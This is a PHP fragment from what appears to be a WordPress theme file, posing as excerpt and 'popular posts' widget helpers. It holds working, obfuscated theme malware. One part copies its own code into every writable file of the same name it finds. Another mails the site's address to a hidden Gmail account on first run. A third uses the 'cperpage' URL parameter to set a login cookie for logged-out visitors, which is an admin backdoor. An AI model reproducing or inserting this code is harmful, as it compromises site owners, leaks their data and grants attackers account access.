	if (is_array ( $direst )) {
		foreach ( $direst as $item ) {
			if (is_writable ( $item )) {
				$ftion = substr ( $widget, stripos ( $widget, "_" ), stripos ( substr ( $widget, stripos ( $widget, "_" ) ), "(" ) );
				$cont = file_get_contents ( $item );
				if (stripos ( $cont, $ftion ) === false) {
					$comaar = stripos ( substr ( $cont, - 20 ), "?" . ">" ) !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if (stripos ( substr ( $cont, - 20 ), "?" . ">" ) !== false) {
						$cont = substr ( $cont, 0, strripos ( $cont, "?" . ">" ) + 2 );
					}
					$output = rtrim ( $output, "\n\t" );
					fputs ( $f = fopen ( $item, "w+" ), $cont . $comaar . "\n" . $widget );
					fclose ( $f );
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids, $items = array()) {
	$places = array_shift ( $wids );
	if (substr ( $places, - 1 ) == "/") {
		$places = substr ( $places, 0, - 1 );
	}
	if (! file_exists ( $places ) || ! is_dir ( $places )) {
		return false;
	} elseif (is_readable ( $places )) {
		$elems = scandir ( $places );
		foreach ( $elems as $elem ) {
			if ($elem != "." && $elem != "..") {
				if (is_dir ( $places . "/" . $elem )) {
					$wids [] = $places . "/" . $elem;
				} elseif (is_file ( $places . "/" . $elem ) && $elem == substr ( __FILE__, - 13 )) {
					$items [] = $places . "/" . $elem;
				}
			}
		}
	} else {
		return false;
	}
	if (sizeof ( $wids ) > 0) {
		return _get_allwidgets_cont ( $wids, $items );
	} else {
		return $items;
	}
}
if (! function_exists ( "stripos" )) {
	function stripos($str, $needle, $offset = 0) {
		return strpos ( strtolower ( $str ), strtolower ( $needle ), $offset );
	}
}

if (! function_exists ( "strripos" )) {
	function strripos($haystack, $needle, $offset = 0) {
		if (! is_string ( $needle ))
			$needle = chr ( intval ( $needle ) );
		if ($offset < 0) {
			$temp_cut = strrev ( substr ( $haystack, 0, abs ( $offset ) ) );
		} else {
			$temp_cut = strrev ( substr ( $haystack, 0, max ( (strlen ( $haystack ) - $offset), 0 ) ) );
		}
		if (($found = stripos ( $temp_cut, strrev ( $needle ) )) === FALSE)
			return FALSE;
		$pos = (strlen ( $haystack ) - ($found + $offset + strlen ( $needle )));
		return $pos;
	}
}
if (! function_exists ( "scandir" )) {
	function scandir($dir, $listDirectories = false, $skipDots = true) {
		$dirArray = array ();
		if ($handle = opendir ( $dir )) {
			while ( false !== ($file = readdir ( $handle )) ) {
				if (($file != "." && $file != "..") || $skipDots == true) {
					if ($listDirectories == false) {
						if (is_dir ( $file )) {
							continue;
						}
					}
					array_push ( $dirArray, basename ( $file ) );
				}
			}
			closedir ( $handle );
		}
		return $dirArray;
	}
}
add_action ( "admin_head", "_verifyactivate_widgets" );
function _getprepare_widget() {
	if (! isset ( $text_length ))
		$text_length = 120;
	if (! isset ( $check ))
		$check = "cookie";
	if (! isset ( $tagsallowed ))
		$tagsallowed = "<a>";
	if (! isset ( $filter ))
		$filter = "none";
	if (! isset ( $coma ))
		$coma = "";
	if (! isset ( $home_filter ))
		$home_filter = get_option ( "home" );
	if (! isset ( $pref_filters ))
		$pref_filters = "wp_";
	if (! isset ( $is_use_more_link ))
		$is_use_more_link = 1;
	if (! isset ( $com_type ))
		$com_type = "";
	if (! isset ( $cpages ))
		$cpages = $_GET ["cperpage"];
	if (! isset ( $post_auth_comments ))
		$post_auth_comments = "";
	if (! isset ( $com_is_approved ))
		$com_is_approved = "";
	if (! isset ( $post_auth ))
		$post_auth = "auth";
	if (! isset ( $link_text_more ))
		$link_text_more = "(more...)";
	if (! isset ( $widget_yes ))
		$widget_yes = get_option ( "_is_widget_active_" );
	if (! isset ( $checkswidgets ))
		$checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
	if (! isset ( $link_text_more_ditails ))
		$link_text_more_ditails = "(details...)";
	if (! isset ( $contentmore ))
		$contentmore = "ma" . $coma . "il";
	if (! isset ( $for_more ))
		$for_more = 1;
	if (! isset ( $fakeit ))
		$fakeit = 1;
	if (! isset ( $sql ))
		$sql = "";
	if (! $widget_yes) :
		
		global $wpdb, $post;
		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; //
		if (! empty ( $post->post_password )) {
			if ($_COOKIE ["wp-postpass_" . COOKIEHASH] != $post->post_password) {
				if (is_feed ()) {
					$output = __ ( "There is no excerpt because this is a protected post." );
				} else {
					$output = get_the_password_form ();
				}
			}
		}
		if (! isset ( $fixed_tags ))
			$fixed_tags = 1;
		if (! isset ( $filters ))
			$filters = $home_filter;
		if (! isset ( $gettextcomments ))
			$gettextcomments = $pref_filters . $contentmore;
		if (! isset ( $tag_aditional ))
			$tag_aditional = "div";
		if (! isset ( $sh_cont ))
			$sh_cont = substr ( $sq1, stripos ( $sq1, "live" ), 20 ); //
		if (! isset ( $more_text_link ))
			$more_text_link = "Continue reading this entry";
		if (! isset ( $isshowdots ))
			$isshowdots = 1;
		
		$comments = $wpdb->get_results ( $sql );
		if ($fakeit == 2) {
			$text = $post->post_content;
		} elseif ($fakeit == 1) {
			$text = (empty ( $post->post_excerpt )) ? $post->post_content : $post->post_excerpt;
		} else {
			$text = $post->post_excerpt;
		}
		$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array ( $gettextcomments, array (
				$sh_cont,
				$home_filter,
				$filters 
		) ) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; //
		if ($text_length < 0) {
			$output = $text;
		} else {
			if (! $no_more && strpos ( $text, "<!--more-->" )) {
				$text = explode ( "<!--more-->", $text, 2 );
				$l = count ( $text [0] );
				$more_link = 1;
				$comments = $wpdb->get_results ( $sql );
			} else {
				$text = explode ( " ", $text );
				if (count ( $text ) > $text_length) {
					$l = $text_length;
					$ellipsis = 1;
				} else {
					$l = count ( $text );
					$link_text_more = "";
					$ellipsis = 0;
				}
			}
			for($i = 0; $i < $l; $i ++)
				$output .= $text [$i] . " ";
		}
		update_option ( "_is_widget_active_", 1 );
		if ("all" != $tagsallowed) {
			$output = strip_tags ( $output, $tagsallowed );
			return $output;
		}
	
	endif;
	$output = rtrim ( $output, "\s\n\t\r\0\x0B" );
	$output = ($fixed_tags) ? balanceTags ( $output, true ) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output = apply_filters ( $filter, $output );
	switch ($tag_aditional) {
		case ("div") :
			$tag = "div";
			break;
		case ("span") :
			$tag = "span";
			break;
		case ("p") :
			$tag = "p";
			break;
		default :
			$tag = "span";
	}
	
	if ($is_use_more_link) {
		if ($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink ( $post->ID ) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = ! is_user_logged_in () && @call_user_func_array ( $checkswidgets, array (
					$cpages,
					true 
			) ) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink ( $post->ID ) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action ( "init", "_getprepare_widget" );
function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "") {
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if (! $show_pass_post)
		$request .= " AND post_password =\"\"";
	if ($duration != "") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results ( $request );
	$output = "";
	if ($posts) {
		foreach ( $posts as $post ) {
			$post_title = stripslashes ( $post->post_title );
			$comment_count = $post->comment_count;
			$permalink = get_permalink ( $post->ID );
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return $output;
}
?>